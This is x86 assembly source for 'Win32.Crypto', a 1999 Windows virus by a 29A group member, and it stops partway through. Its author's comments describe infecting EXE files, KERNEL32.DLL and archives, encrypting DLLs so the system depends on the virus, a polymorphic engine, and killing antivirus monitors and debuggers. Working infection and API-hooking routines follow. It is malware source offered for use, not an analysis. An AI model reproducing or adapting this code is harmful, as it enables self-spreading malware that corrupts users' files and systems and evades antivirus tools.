;
;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿
;  : Prizzy/29A :		 Win32.Crypto		      : Prizzy/29A :
;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ
;
;   I'm very proud on my very first virus at Win32 platform. It infects EXE
;   files with PE (Portable Executable) header. Also it can compress itself
;   into ZIP/ARJ/RAR/ACE/CAB archivez. If the virus catch DLL opeations, it
;   encrypt/decrypt that by cryptography functions. Thus, we can  pronounce
;   the system is dependents on the virus (OneHalf idea).
;
;   When infected EXE is started, it infects KERNEL32.DLL, hooks some Win32
;   functions and next reboot is actived. It catches "all" file operations,
;   create thread/mutex, run Hyper Infection  for API to find  archivez, AV
;   checksum files, EXEs and so on.
;
;   If PHI-API will find an archive program, the virus compress itself	and
;   add itself to body (inside, not at the end). My PPE-II does NOT support
;   copro & mmx garbages, only based with many features are new.
;
;
;			     Detailed Information
;			    ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;
;   Cryptography Area, based on WinAPI (SR2/NT) functions
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   Let us start. I exploited One Half technics for Win32 world, new method
;   in our VX world. You exactly know One Half tries to encode your sectors
;   and if you want to read its he decodes ones and so on, you exactly know
;   what I think. Well, and because I use kernel32 infection I can hook all
;   file functions. Then I decode all DLL files by PHI-II (Hyper Infection)
;   and if the system wants to open DLL file I decode one, and so on. Then,
;   the Win32 system is dependents on my virus. Naturally, the user can re-
;   install Win95/98/NT/2000 but then DLL are in MSOffice, Visual C++, ICQ,
;   Outlook, AutoCAD and many many more appz. For comparison:  my Win98 has
;   831 DLL files and on my all disks are 5103 DLL files (including Win2k).
;   I know this is the perfect way to get all what you want. But I've found
;   out I can't hook all Win32 file operations so, true crypto DLL  will be
;   inside Ring0/Ring3 world - my future work...
;
;
;   Prizzy Polymorphic Engine (PPE-II new version)
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   I've removed all copro & mmx garbages and I've coded these new stuff:
;	* brute-attack algorithm
;	* random multi-layer engine
;   By "brute-attack" I'm finding right code value by checksum. And because
;   I don't know that number, AV neither. This process can take mostly 0.82
;   seconds on my P233. For more info find "ppe_brute_init:" in this source
;
;   In the second case I don't decode by default (up to down) but by random
;   multi-layer algorithm. It means  I generate the certain  buffer and  by
;   its I decode up or down. Thus I can generate more  then 950  layers and
;   typical some 69 layers. Also the  random buffer, behind  poly loop, has
;   anti-heuristic protection (gaps) to AV couldn't simulate  that process.
;   So, only in my decoding loop are  stored the places where the gaps are.
;   Find "ppe_mlayer_generate:" label for many momre information.
;
;
;   Infection ZIP/ARJ/RAR/ACE/CAB archivez, including RAR/ACE EXE-SFX
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   I will find these archive programs and by them I will compress some in-
;   fected file by random compression level. Then the dropper is stored in-
;   side archive, not at the end. So, I don't need have any CRC algorithms.
;   However these operations are very complex, especially ZIP infection but
;   it isn't impossible. So, AV cannot check only last file (stored) in ar-
;   chive, but inside it.
;
;
;				 Main features
;				ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;
;   * Platforms:      Windows 95/98, Windows NT/2000 (tested on 2031 build)
;   * Residency:      Yes, KERNEL32 way, working on 95/98 and NT/2k systems
;   * Non-residency:  Yes, only K32 infection
;   * Stealth:	      Yes, DLLs working; opening, copying and loading
;   * AntiDebugging:  Yes, some stupid debuggers like TD32; routinues for
;		      disable SoftICE 95/NT.
;   * AntiHeuristic:  Yes, threads way and multi-layer anti-heuristic
;   * AntiAntivirus:  Yes, deleting checksum files, hacking AVAST database
;   * Other anti-*:   Yes, anti-emulator, anti-bait, anti-monitor
;   * Fast Infection: Yes/No, infect only 20 EXEs every reboot, but infect
;		      all types of archivez on all diskz
;   * Polymomrphism:  Yes, using based garbages from Win9x.Prizzy, inclu-
;		      ding brute-force way and random multi-layer way
;   * Other features: (a) Use of brute-CRC64 algorithm to find APIs in K32
;		      (b) Encoding and decoding DLLs in real time
;		      (c) Memory allocations by "CreateFileMapping" func.
;			  'cause of sharing among processes
;		      (d) Use of threads, mutexes & process tricks
;		      (e) Support of "do not infected" table
;		      (f) Checking files by natural logarithm
;		      (g) No optimalization, yeah, I don't lie (read
;			  "Words from Prizzy" 29A #4 to know why)
;		      (h) UniCode support
;
;
;				   Greetings
;				  ÄÄÄÄÄÄÄÄÄÄÄ
;
;   And finally my greetz go to:
;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;     Darkman	     u're really great inet pal, thanx for fun on #virus :)
;     Benny	     thanx for big help with threads, mutexes... we're wait-
;		     ing for Darkman's trip here, aren't we :) ?
;     GriYo	     nah, I'd like to understand your ideas... thanx :) !
;     Flush	     u've really big anti-* ideas, dude
;     MemoryLapse    yeah, K32 infection... go out of efnet to undernet
;     LordJulus      you have great vx articles, viruses ...
;     Asmodeus	     finish that virus and release it; thanx for your trust
;     AV companies   just where is my win9x.prizzy description :) ?
;     ...and for VirusBuster and Bumblebee
;
;
;   Contact me
;   ÄÄÄÄÄÄÄÄÄÄ
;     prizzy@coderz.net
;     http://prizzy.cjb.net
;
;
;   (c)oded by Prizzy/29A, December 1999
;
;

		.386p
		.model	flat,STDCALL

		include Include\Win32API.inc
		include Include\UseFul.inc
		include Include\MZ.inc
		include Include\PE.inc

		extrn	ExitProcess:proc
		extrn	MessageBoxA:proc

;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

.data
		db	?
.code

;ÄÄÄ´ some equ's needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;DEBUG		 equ	 YEZ			 ;only for debug and 1st start

mem_size	equ	(mem_end -virus_start)	;size of virus in memory
file_size	equ	(file_end-virus_start)	;size of virus in file

infect_minsize	equ	4096			;only filez bigger then 4K
infect_maxsize	equ	100*1024*1024		;to 100Mb

access_ebx	equ	(dword ptr 16)		;access into stack when
access_edx	equ	(dword ptr 20)		;will be used pushad
access_ecx	equ	(dword ptr 24)
access_eax	equ	(dword ptr 28)

search_mem_size equ	100*(size dta+size search_address)

;ÄÄÄ´ some structurez for virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

dta_struc		struc			;Win32_FIND_DATA structure
dta_fileattr		dd	?		;for FindFirstFile function
dta_time_creation	dq	?
dta_time_lastaccess	dq	?
dta_time_lastwrite	dq	?
dta_filesize_hi 	dd	?
dta_filesize		dd	?
dta_reserved_0		dd	?
dta_reserved_1		dd	?
dta_filename		db	260 dup (?)
dta_filename_short	db	14 dup (?)
			ends

sysTime_struc		struc			;used by my Windows API
wYear			dw	0000h		;"hyper infection"
wMonth			dw	0000h
wDayOfWeek		dw	0000h
wDay			dw	0000h
wHour			dw	0000h
wMinute 		dw	0000h
wSecond 		dw	0000h
wMilliseconds		dw	0000h
			ends

Process_Information	struc			;CreateProcess: struc #1
hProcess		dd	00000000h
hThread 		dd	00000000h
dwProcessId		dd	00000000h
dwThreadId		dd	00000000h
			ends

Startup_Info		struc			;CreateProcess: struc #2
cb			dd	00000000h
lpReserved		dd	00000000h	;this struc has been stolen
lpDesktop		dd	00000000h	;from "Win32 Help"
lpTitle 		dd	00000000h
dwX			dd	00000000h
dwY			dd	00000000h
dwXSize 		dd	00000000h
dwYSize 		dd	00000000h
dwXCountChars		dd	00000000h
dwYCountChars		dd	00000000h
dwFillAttribute 	dd	00000000h
dwFlags 		dd	00000000h
wShowWindow		dw	0000h
cbReserved2		dw	0000h
lpReserved2		dd	00000000h
hStdInput		dd	00000000h
hStdOutput		dd	00000000h
hStdError		dd	00000000h
			ends

File_Time		struc			;get/set file time struc
dwLowDateTime		dd	00000000h
dwHighDateTime		dd	00000000h
			ends

;ÄÄÄ´ some macroz needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		; search "anti-emulators:" for more information

@ANTI_E_START		macro	start_hack, finish_hack
			WHILE	(num NE 0)
			  push	dword ptr [ebp+start_hack + \
				((finish_hack-start_hack) / 4 + 1 - num) * 4]
			  num = num - 1
			endm
		num = (finish_hack - start_hack) / 4 + 1
			endm

@ANTI_E_FINISH		macro	start_hack, finish_hack, thread_handle
			WHILE	(num NE 0)
			  pop	dword ptr [ebp+finish_hack - \
				(finish_hack-start_hack) mod 4 - \
				((finish_hack-start_hack) / 4 + 1 - num) * 4]
			  num = num - 1
			endm
			call	[ebp+ddCloseHandle], thread_handle
		num = (finish_hack - start_hack) / 4 + 1
			endm

;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
virus_start:

		call	get_base_ebp		;get actual address to EBP

		mov	eax,ebp
		db	2Dh			;sub eax,infected_ep
infected_ep:	dd	00001000h
		db	05h			;add eax,original_ep
original_ep:	dd	00000000
		sub	eax,[ebp+__pllg_lsize]
		push	eax			;host address

		; use anti-emulator
		pusha
		@SEH_SetupFrame <jmp __anti_e_1>;set SEH handler
		call	$			;ehm :)
		jmp	__return
	__anti_e_1:
		@SEH_RemoveFrame		;reset SEH handler
		popa

		call	find_kernel32		;find kernel's base address

		; use anti-emulator
		@ANTI_E_START __thread_1_begin, __thread_1_finish
		lea	eax,[ebp+__thread_1]	;thread function
		mov	ebx,offset __thread_1_begin + \
			    (__thread_1_finish - __thread_1_begin) \
			    shl 18h		;upper imm8 register in EBX
		call	__MyCreateThread	; * anti-heuristic
	__thread_1_begin	equ this byte
		jmp	$			;anti-emulator :)
		jmp	__return		;patch this ! random number
	__thread_1_finish	equ this byte
		@ANTI_E_FINISH __thread_1_begin, __thread_1_finish, eax

		; next code...
		call	kill_av_monitors	;kill AVP, AVAST32 etc.
		call	kill_debuggers		;bye, bye SoftICE, my honey
		call	create_mutex		;already resident ?
		jc	__return		;go back, if yes
		call	crypto_startup
		call	infect_kernel		;ehm, find kernel and infect!

__return:
		pop    eax
		add    eax,offset virus_start
		jmp    eax			;go back, my lord...

;ÄÄÄ´ main function for infect file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This is main function which infects file.
		;
		;Extension support:
		;    EXE ... executable file (PE), RAR/ACE SFX file
		;    DLL ... kernel32 infection, encypting through PHI-API
		;    CAB ... infecting Microsoft Cabinet File
		;    ZIP/ARJ/RAR/ACE ... dropper compressed,inside archive
		;
		;Okay, here is truth. I had many problems with EXE and DLL
		;infection in this function. I found  out  all valuez have
		;to be aligned etc. Especially Win2k need that. I also use
		;"CheckSumMappedFile" function to calculate appz checksum.
		;
infect_file:

		; save registers & get delta
		pusha
		call	get_base_ebp

		; get extension
		mov	edi,[ebp+filename_ptr]

		; convert lowercase characters to uppercase
		push	edi
		call	[ebp+ddlstrlen] 	;get length of filename
		inc	eax			;number of characters to
		push	eax			;progress
		push	edi			;filename
		call	[ebp+ddCharUpperBuffA]	;convert to uppercase

		; infect only files in these dirz
	IFDEF DEBUG
		cmp	[edi+00000000h],'W\:C'	;"C:\WIN\WEWB4\XX\"
		jnz	__if_debug		;directory
		cmp	[edi+00000004h],'W\NI'
		jnz	__if_debug
		cmp	[edi+00000008h],'4BWE'
		jnz	__if_debug
		cmp	[edi+0000000Ch],'\XX\'
		jz	__if_debug2
	    __if_debug:
		cmp	[edi],'W\:C'		;"C:\WINDOWS\KERN"
		jnz	infect_file_exit
		cmp	[edi+4],'ODNI'
		jnz	infect_file_exit
		cmp	[edi+8],'K\SW'
		jnz	infect_file_exit
		cmp	[edi+8+4],'ENRE'
		jnz	infect_file_exit
	    __if_debug2:
	ENDIF

		; check file name (by avoid table)
		mov	ebx,[ebp+filename_ptr]	;filename
		lea	esi,[ebp+avoid_table]	;avoid table
		call	validate_name
		jc	infect_file_exit

		; check AV files (anti-bait)
		call	fuck_av_files
		jc	infect_file_exit

		; get extension
		cld
		mov	al,'.'			;search this char
		mov	cx,filename_size	;max filename_size
		repnz	scasb			;searching...
		dec	edi			;set to that char
		cmp	al,[edi]		;check again !
		jnz	infect_file_exit	;shit, bad last char

	IFDEF DEBUG
		mov	eax,[edi-4]		;you can infect only
		cmp	eax,'23LE'
		jz	__OnlyMyKernel
		cmp	eax,'DCBA'		;this file on my disk
		jnz	infect_file_exit	;i won't risk
	    __OnlyMyKernel:
	ENDIF
		; get file information
		lea	esi,[ebp+dta]		;dta structure
		mov	edx,[ebp+filename_ptr]	;FileName pointer
		call	__MyFindFirst
		jc	infect_file_exit	;success ?
		call	__MyFindClose		;close handle

		cmp	dword ptr [ebp+it_is_kernel],00000001h
		jz	infect_file_continue	;if kernel32, infect it

		; check extension
		mov	eax,[edi]		;get ext of file
		not	eax
		cmp	eax,not 'EXE.'		;is it EXE file ?
		jnz	next_ext_1
		call	infect_ACE_RAR		;is it ACE/RAR EXE-SFX file ?
		jnc	infect_file_exit
		jmp	next_ext_end
	next_ext_1:
		cmp	eax,not 'ECA.'		;is it ACE archive file ?
		jnz	next_ext_2
		call	infect_ACE
	next_ext_2:
		cmp	eax,not 'RAR.'		;is it RAR archive file ?
		jnz	next_ext_3
		call	infect_RAR
	next_ext_3:
		cmp	eax,not 'JRA.'		;is it ARJ archive file ?
		jnz	next_ext_4
		call	infect_ARJ
	next_ext_4:
		cmp	eax,not 'PIZ.'		;is it ZIP archive file ?
		jnz	next_ext_5
		call	infect_ZIP
	next_ext_5:
		cmp	eax,not 'BAC.'		;is it CAB archive file ?
		jnz	infect_file_exit
		call	infect_CAB
		jmp	infect_file_exit
	next_ext_end:				;infect if any EXE file

		; check number of infected files
		cmp	[ebp+NewACE.dropper],00000000h
		jz	infect_file_continue	;dropper exists ?
		cmp	dword ptr [ebp+file_infected],20
		jae	infect_file_exit	;infected more then 20 EXEs ?

		; check file size
	infect_file_continue:
		mov	eax,[ebp+dta.dta_filesize]
		cmp	eax,infect_minsize	;is filesize smaller ?
		jb	infect_file_exit
		cmp	eax,infect_maxsize	;is filesize bigger ?
		ja	infect_file_exit

		; set file attributes
		mov	ecx,FILE_ATTRIBUTE_NORMAL
		mov	edx,[ebp+filename_ptr]
		call	__MySetAttrFile
		jc	infect_file_exit	;success ?

		; open file
		mov	edx,[ebp+filename_ptr]
		call	__MyOpenFile		;open file !
		jc	infect_file_restattr
		mov	[ebp+file_handle],eax

		; create a memory map object
		push	00000000h		;name of file mapping object
		push	00000000h		;low 32 bits of object size
		push	00000000h		;high 32 bits of object size
		push	PAGE_READONLY		;get needed valuez, etc.
		push	00000000h		;optional security attributes
		push	[ebp+file_handle]	;handle to file to map
		call	[ebp+ddCreateFileMappingA]
		or	eax,eax 		;failed ?
		jz	infect_file_close
		mov	[ebp+file_hmap],eax	;store mapped file handle

		; view of file in our address
		push	00000000h		;number of bytes to map
		push	00000000h		;low 32 bits of the offset
		push	00000000h		;high 32 bits of the offset
		push	FILE_MAP_READ		;access mode
		push	[ebp+file_hmap] 	;mapped file handle
		call	[ebp+ddMapViewOfFile]
		or	eax,eax 		;failed ?
		jz	infect_file_closeMap
		mov	[ebp+file_hmem],eax	;mapped file in memory

		; check file signature
		cmp	word ptr [eax.MZ_magic], \
			IMAGE_DOS_SIGNATURE	;test 'MZ'
		jnz	infect_file_unMap

		; check "PE" valuez
		cmp	word ptr [eax.MZ_crlc],0000h
		jz	infect_file_okay	;no PE ?
		cmp	word ptr [eax.MZ_lfarlc],0040h
		jb	infect_file_unMap	;bad PE ?

	infect_file_okay:
		; seek on NT header
		mov	esi,eax
		add	esi,[eax.MZ_lfanew]
		push	esi
		call	[ebp+ddIsBadCodePtr]	;can we read memory at least?
		or	eax,eax
		jnz	infect_file_unMap

		; check "PE" signature
		cmp	dword ptr [esi.NT_Signature], \
			IMAGE_NT_SIGNATURE
		jnz	infect_file_unMap	;is it really 'PE\0\0' ?

		; already infected ?
		mov	eax,[ebp+file_hmem]	;mapped file in memory
		add	eax,[ebp+dta.dta_filesize]
		mov	eax,[eax-00000004h]	;infected dword flag
		call	__check_infected
		jnc	infect_file_unMap

		; check header flags
		mov	ax,[esi+NT_FileHeader.FH_Characteristics]
		test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
		jz	infect_file_unMap
		test	ax,IMAGE_FILE_DLL	;no DLL ?
		jz	infect_file_no_dll
		cmp	dword ptr [ebp+it_is_kernel],00000000h
		jz	infect_file_unMap	;is it kernel32 infection ?

	infect_file_no_dll:
		call	__getLastObjectTable	;seek on last object table

		; alloc memory for polymorphic engine
		mov	eax,file_size + 30000h
		call	malloc
		mov	[ebp+mem_address],eax
		add	eax,file_size
		mov	[ebp+poly_start],eax

		; get new entry-point (EXE), or change IT of kernel32 ?
		mov	eax,[ebx+SH_SizeOfRawData]
		add	eax,[ebx+SH_VirtualAddress]
		mov	dword ptr [ebp+infected_ep],eax
		mov	eax,[esi+NT_OptionalHeader.OH_AddressOfEntryPoint]
		mov	dword ptr [ebp+original_ep],eax

		mov	[ebp+poly_finish],mem_size

		; run Prizzy Polymorphic Engine (PPE-II)
		cmp	dword ptr [ebp+it_is_kernel],00000000h
		jnz	infect_file_common

		call	ppe_startup

		; calculate maximum infected file size
	infect_file_common:
		mov	eax,[ebx+SH_SizeOfRawData]	;file size
		add	eax,[ebx+SH_PointerToRawData]
		add	eax,[ebp+poly_finish]		; + virus file size
		add	eax,00000004h			; + infected flag
		mov	ecx,[esi+NT_OptionalHeader.OH_FileAlignment]
		xor	edx,edx
		add	eax,ecx
		dec	eax
		div	ecx
		mul	ecx
		push	eax

		; unmap file object
		push	[ebp+file_hmem]
		call	[ebp+ddUnmapViewOfFile]

		; close mapping file object
		push	[ebp+file_hmap]
		call	[ebp+ddCloseHandle]

		; reopen memory mapped file object
		push	00000000h		;name of file mapping object
		push	dword ptr [esp+0000004h];low 32 bits of object size
		push	00000000h		;high 32 bits of object size
		push	PAGE_READWRITE		;get needed valuez, etc.
		push	00000000h		;optional security attributes
		push	[ebp+file_handle]	;handle to file to map
		call	[ebp+ddCreateFileMappingA]
		mov	[ebp+file_hmap],eax	;store mapped file handle

		; view of file in our memory
		push	00000000h		;number of bytes to map
		push	00000000h		;low 32 bits of the offset
		push	00000000h		;high 32 bits of the offset
		push	FILE_MAP_WRITE		;access mode
		push	[ebp+file_hmap] 	;mapped file handle
		call	[ebp+ddMapViewOfFile]
		mov	[ebp+file_hmem],eax	;mapped file in memory

		; seek on last object table
		add	eax,[eax.MZ_lfanew]
		mov	esi,eax
		call	__getLastObjectTable

		; infect "KERNEL32" file OR change EntryPoint
		cmp	dword ptr [ebp+it_is_kernel],00000000h
		jz	infect_file_entry
		mov	[ebp+__pllg_lsize],00000000h ;more info in that func
		call	infect_file_kernel	;hook "kernel32" table :)
		jmp	infect_file_no_change
	infect_file_entry:
		mov	eax,dword ptr [ebp+infected_ep]
		add	eax,[ebp+file_size3]
		mov	[esi+NT_OptionalHeader.OH_AddressOfEntryPoint],eax

		; copy mem_address (virus body) to the end of file
	infect_file_no_change:
		push	esi
		mov	esi,[ebp+mem_address]	;source data
		mov	edi,[ebx+SH_SizeOfRawData]
		add	edi,[ebx+SH_PointerToRawData]
		add	edi,[ebp+file_hmem]	;destination pointer
		mov	ecx,[ebp+poly_finish]	;number of bytes to copy
		rep	movsb
		pop	esi

		; calculate new physical size
		mov	eax,[ebp+poly_finish]
		cmp	dword ptr [ebp+it_is_kernel],00000000h
		jz	$ + 7			;this isn't logic but i had
		mov	eax,mem_size		;problems in k32 memory
		add	eax,[ebx+SH_SizeOfRawData]
		mov	ecx,[esi+NT_OptionalHeader.OH_FileAlignment]
		xor	edx,edx
		add	eax,ecx
		dec	eax
		div	ecx
		mul	ecx
		mov	[ebx+SH_SizeOfRawData],eax

		; calculate new potential virtual size
		mov	eax,[ebx+SH_VirtualSize]
		add	eax,mem_size
		mov	ecx,[esi+NT_OptionalHeader.OH_SectionAlignment]
		xor	edx,edx
		add	eax,ecx
		dec	eax
		div	ecx
		mul	ecx

		; if new phys_size > virt_size	==>  virt_size = phys_size
		cmp	eax,[ebx+SH_SizeOfRawData]
		jnc	infect_file_no_update
		mov	eax,[ebx+SH_SizeOfRawData]
	infect_file_no_update:
		mov	[ebx+SH_VirtualSize],eax

		add	eax,[ebx+SH_VirtualAddress]

		; infected host increased an image size ?
		cmp	eax,[esi+NT_OptionalHeader.OH_SizeOfImage]
		jc	infect_no_update_2
		mov	[esi+NT_OptionalHeader.OH_SizeOfImage],eax
	infect_no_update_2:

		; set these PE flags
		or	dword ptr [ebx+SH_Characteristics], \
			IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or \
			IMAGE_SCN_MEM_WRITE

		; already infected flag
		mov	eax,02302301h		;special number
		call	ppe_get_rnd_range
		inc	eax			;it can't be zero
		imul	eax,117 		;encrypt one
		pop	edi			;file size + virus size
		mov	[ebp+file_hsize],edi
		add	edi,[ebp+file_hmem]	;mapped file in memory
		mov	[edi-00000004h],eax	;already infected flag

		; calculate new checksum because of Win2k and WinNT :)
		cmp	dword ptr [esi+NT_OptionalHeader. \
				       OH_CheckSum],00000000h
		jz	infect_file_no_checksum
		@pushsz "IMAGEHLP.DLL"		;load "IMAGEHLP.DLL" library
		call	[ebp+ddLoadLibraryA]
		or	eax,eax 		;failed ?
		jz	infect_file_no_checksum
		push	eax			;parameter for FreeLibrary

		; get function to calculate checksum
		@pushsz "CheckSumMappedFile"	;get address of this function
		push	eax			;library handle
		call	[ebp+ddGetProcAddress]
		or	eax,eax
		jz	infect_file_deload

		; calculate checksum
		lea	ecx,[esi+NT_OptionalHeader.OH_CheckSum]
		push	ecx			;receives computed checksum
		call	$+9			;header old checksum
		dd	?
		push	dword ptr [ebp+file_hsize]
		push	[ebp+file_hmem] 	;memory mapped address
		call	eax

	infect_file_deload:
		call	[ebp+ddFreeLibrary]

		; dealloc memory for PPE-II
	infect_file_no_checksum:
		mov	eax,[ebp+mem_address]
		call	mdealloc

		; new infected file
		inc	dword ptr [ebp+file_infected]

		; use for acrhive dropper ?
		cmp	dword ptr [ebp+dta.dta_filesize],30000
		ja	infect_file_unMap	;for archive fsize < 30Kb
		push	[ebp+file_hmem] 	;mapped file in memory
		call	[ebp+ddUnmapViewOfFile]
		push	[ebp+file_hmap] 	;mapped file object
		call	[ebp+ddCloseHandle]
		mov	ebx,[ebp+file_handle]	;I must close infected file
		call	__MyCloseFile		;coz I'll copy it, etcetera
		call	__add_dropper		;compress it by ZIP, RAR ...
		jmp	infect_file_restattr

	infect_file_unMap:
		push	[ebp+file_hmem] 	;mapped file in memory
		call	[ebp+ddUnmapViewOfFile]
	infect_file_closeMap:
		push	[ebp+file_hmap] 	;mapped file object
		call	[ebp+ddCloseHandle]
	infect_file_time:
		lea	eax,[ebp+dta.dta_time_lastwrite]
		lea	ecx,[ebp+dta.dta_time_lastaccess]
		lea	edx,[ebp+dta.dta_time_creation]
		call	[ebp+ddSetFileTime], \
			[ebp+file_handle], \
			edx, ecx, eax
	infect_file_close:
		mov	ebx,[ebp+file_handle]	;close file handle
		call	__MyCloseFile
	infect_file_restattr:
		mov	ecx,[ebp+dta.dta_fileattr]
		mov	edx,[ebp+filename_ptr]	;restore file attributes
		call	__MySetAttrFile

	infect_file_exit:
		popa				;go to HyperInfection or to
		ret				;Kernel32 hooked functions

		;---------------------------------------------------------
		;Common file infected semi-functions.
		;
	__getLastObjectTable:
		movzx	eax,[esi+NT_FileHeader.FH_NumberOfSections]
		cdq
		mov	ecx,IMAGE_SIZEOF_SECTION_HEADER
		dec	eax
		mul	ecx			;eax=offs of last section

		movzx	edx,[esi+NT_FileHeader.FH_SizeOfOptionalHeader]
		add	eax,edx
		add	eax,esi
		add	eax,offset NT_OptionalHeader.OH_Magic ;seek to l.o. table

		xchg	eax,ebx
		ret

;ÄÄÄ´ function to hook some funtions from KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;At last I've finished this unpalatable function. I remem-
		;ber how hardly I have	found an  interesting source about
		;this method because I have many many  problems with this.
		;So, let's begin. At first I will get these addresses:
		;   * name table pointer (as are function names)
		;   * address table pointer (as are functions addresses)
		;   * ordinal table pointer
		;Then I'll get function name, calculate its CRC32 and I'll
		;compare it  with my future-hooked CRC32  table. If I will
		;find it, i will save its original address,  replace by my
		;my new offset and I'll write it to the file.
		;
		;I would like to thank:
		;   * "Memory Lapse" for his "Win32.Heretic" source
		;   * Darkman/29A for giving me that source
		;
		;I must infect "kernel32.dll" because I must hook all disk
		;functions because of "Prizzy Hyper Infection for API".
		;
infect_file_kernel:

		; save all registers
		pusha

		; check address of APIs in KERNEL32 file body
		mov	eax,[ebp+file_hmem]
		add	eax,[eax.MZ_lfanew]	;go to new "PE" header

		mov	eax,dword ptr [eax.OH_DirectoryEntries + \
			    IMAGE_SIZEOF_FILE_HEADER + \
			    00000004h]		;get Export Directory Table
		add	eax,[ebp+file_hmem]

		mov	ebx,[eax.ED_AddressOfOrdinals]
		mov	esi,[eax.ED_AddressOfNames]
		mov	edx,[eax.ED_AddressOfFunctions]
		push	[eax.ED_BaseOrdinal]	;save BaseOrdinal
		add	eax,[eax.ED_BaseOrdinal]

		add	ebx,[ebp+file_hmem]	;adjust ordinal table pointer
		add	esi,[ebp+file_hmem]	;adjust name table pointer
		add	edx,[ebp+file_hmem]	;adjust address table pointer
		push	edx esi ebx		;save startup values

		; main loop
		lea	edi,[ebp+Hooked_API]
		mov	ecx,00000001h
	__ifk_next_loop:
		push	edx			;address table pointer
		push	ecx			;save counter
		shl	ecx,01h 		;convert to word index

		movzx	eax,word ptr [ebx+ecx]	;calculate ordinal index
		sub	eax,[esp+00000014h]	;relative to ordinal basee
		shl	eax,02h 		;convert to dword index

		mov	edx,eax
		mov	ecx,[esp+00000010h]	;address pointer table

		add	eax,ecx 		;calculate offset
		lea	ecx,[ecx+edx]		;RVA of API

		push	esi			;address name table
		mov	esi,[esi]		;get pointer from name table
		add	esi,[ebp+file_hmem]
		call	__get_CRC32		;get CRC32 for function name
		cmp	eax,[edi]		;compare CRC32
		pop	esi
		jnz	__ifk_not_found

		push	edi			;load original function addr
		lea	eax,[ebp+Hooked_API]
		sub	edi,eax
		shl	edi,01h 		;so, (x/2)*8
		lea	eax,[ebp+Hooked_API_functions]
		add	edi,eax
		mov	eax,[edi]		;get address into "jmp ????"
		add	eax,ebp 		;ehm, adjust that address
		mov	ebx,[ecx]		;load original address
		add	ebx,[ebp+kernel_base]
		mov	[eax],ebx		;save original func. address
		mov	eax,[edi+00000004h]	;load new address in v.body
		pop	edi
		add	edi,00000004h		;next CRC32 function value

		sub	eax,offset virus_start	; - "offset"
		add	eax,[ebp+dta.dta_filesize] ;new func. pos in "k32"
		mov	[ecx],eax

		; for next loop I must restart these values
		mov	ebx,[esp+00000008h]	;load ordinal table pointer
		mov	esi,[esp+0000000Ch]	;load name table pointer
		mov	edx,[esp+00000010h]	;load address table pointer
		mov	dword ptr [esp],00000000h ;reset counter
		mov	[esp+00000004h],edx	;reset address table pointer
		jmp	__ifk_no_change 	;this was fucking bug !

	__ifk_not_found:
		add	esi,00000004h		;next name pointer
		add	dword ptr [esp + \	;next function pointer
			00000004h],00000004h
	__ifk_no_change:
		pop	ecx			;functions counter
		inc	ecx			;next function
		pop	edx			;address table pointer
		cmp	dword ptr [edi],00000000h ;end of hooked functions ?
		jnz	__ifk_next_loop

		mov	dword ptr [ebp+it_is_kernel],00000000h
		mov	dword ptr [ebp+HyperInfection_k32],00000000h

		; write this virus body to the end of "kernel32.dll"
		; virus body cannot be encrypted...
		lea	esi,[ebp+virus_start]	;start of virus body
		mov	edi,[ebp+mem_address]	;allocated memory
		mov	ecx,mem_size
		rep	movsb

		mov	dword ptr [ebp+it_is_kernel],00000001h
		mov	eax,mem_size		;without poly-engine !!!
		mov	[ebp+poly_finish],eax

		add	esp,4*4
		popa
		ret				;complex way how to go back

;ÄÄÄ´ main function of infect all filez on disks ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function searchs these extensions on all disks:
		;	EXE, ZIP, ARJ, RAR, ACE, CAB, ...
